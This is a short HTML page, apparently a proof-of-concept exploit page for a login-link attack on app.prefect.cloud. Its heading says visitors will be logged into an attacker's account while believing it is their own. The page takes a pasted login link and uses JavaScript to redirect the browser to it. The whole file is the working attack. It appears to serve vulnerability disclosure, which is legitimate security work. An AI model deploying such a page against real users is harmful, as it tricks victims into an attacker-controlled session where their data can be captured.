</head>
<body>
<h4>Using this attack vector, when you visit the application <b>app.prefect.cloud</b> you will be logged into an attacker account thinking it is your account</h4>
<h4>Paste your login link here</h4>

<label>
    <textarea id="textarea"></textarea>
</label>
<button id="button">Submit</button>
<script>
let button = document.querySelector("#button")
let textarea = document.querySelector("#textarea")

button.addEventListener("click",function () {
    window.location.href = textarea.value
})
</script>
